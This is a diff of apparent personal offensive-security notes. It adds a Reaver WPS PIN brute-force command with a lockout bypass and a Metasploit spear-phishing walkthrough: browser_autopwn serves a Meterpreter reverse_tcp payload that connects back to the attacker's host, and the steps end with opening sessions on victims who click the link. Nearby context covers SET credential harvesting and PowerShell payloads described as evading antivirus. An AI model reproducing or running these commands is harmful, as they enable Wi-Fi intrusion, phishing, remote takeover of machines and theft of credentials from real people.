@@ -219,16 +219,20 @@ ifconfig wlan1mon up
 ##############
 sudo wash -i wlan1mon
 	# Note the channel, BSSID (MAC) and ESSID (wifi name)
-reaver -i wlan1mon -c 6 -e "MyWifi" -b 11:11:11:11:11:11 -vv
+reaver -i wlan1mon -c 6 -e "MyWifi" -b 11:11:11:11:11:11 -vv --ignore-locks
 	# -i	# Wireless monitor interface/adapter
 	# -c 6	# The router's channel (using 6 for example)
 	# -e	# The wifi name/ESSID
 	# -b	# The wifi MAc address/BSSID
-	# -vv	# 
+	# -vv	# Verbose mode
 # If you're getting an "[!] Found packet with bad FCS, skipping..." error you can append "--ignore-fcs" to the end of the command
 # Attacks can be paused (need to look up the command though)
 # Make note of the "WPS PIN" and "WPA PSK" when complete
-
+# -n	Can be used to treat a dropped response as a NACK. -If router doesn't respond Reaver will treated it as a failed PIN.
+	# --no-nacks	This is another syntax
+	# Somre no-responses occur do to signal strength. Reaver requires a strong signal
+# --ignore-locks	Ignore being locked out of the system due to too many failed PIN attempts
+	# -L	This might be the short-hand of --ignore-locks but I'm unsure.
 
 
 # SYN SCAN DETECTION
@@ -422,7 +426,7 @@ setoolkit	# Open the social engineering toolkit
 	# Web Jacking replaces iFrames to make highlighted URL links appear legit
 	# Multi Attack Web select a bunch of the attacks that can be launched at once
 	
-# POWERSHELL ATTACKS
+# POWERSHELL ATTACKS (social engineering)
 ####################
 # Because PoSh is native to windows - it doesn't trigger antivirus alarms
 setoolkit
@@ -442,7 +446,7 @@ sessions -i 1	# Reopen your previous session with victim (using ID 1 for example
 sysinfo
 
 
-# CREDENTIAL HARVESTER ATTACK (social engineering
+# CREDENTIAL HARVESTER ATTACK (social engineering)
 #############################
 setoolkit
 	1	# Select option 1...
@@ -456,6 +460,27 @@ setoolkit
 		# Open the rooted targets pc and use their browser to visit the targeted page. It should appear as if nothing's changed except it's actually your clone of the URL they're on
 		# When they enter credentials it will actually save to your system
 		cd /var/www/	# This is where target credentials are saved. Look for the "harvester_" file.
+
+
+# SPEAR PHISING ATTACKS (social engineering)
+#######################
+# This is basic email phishing and attempting to get victims to download an attachment (the payload)
+service postgresql start
+msfconsole
+	search autopwn	# Automatically attack a victim when they visit a webpage (your pre-set trap)
+		# Output should be something like:	auxiliary/server/browser_autopwn
+	use auxiliary/server/browser_autopwn
+	set payload windows/meterpreter/reverse_tcp	# Set Meterpreter as the payload
+	show options
+	set LHOST 192.168.0.109 	# Set your (the attacker's) local IP
+	set URIPATH "pluralsight"	# This string will be appended at the end of the URL
+	exploit
+		# This will launch the attack at address:	http://192.168.0.109:8080/pluralsight
+		# Now you attempt to get a victim to click on this link. autopwn will attempt to create a remote session with anyone who clicks the link.
+		# Meterpreter will tell you, in the terminal, if someone opens a session on the rogue link
+	sessions	# List sessions of victims who clicked the link
+	sessions -i 1	# Root into a specified session ID (in this case 1)
+	sysinfo	# Grab basic device data on victim
 
 
 # BRUTE FORCE SSH
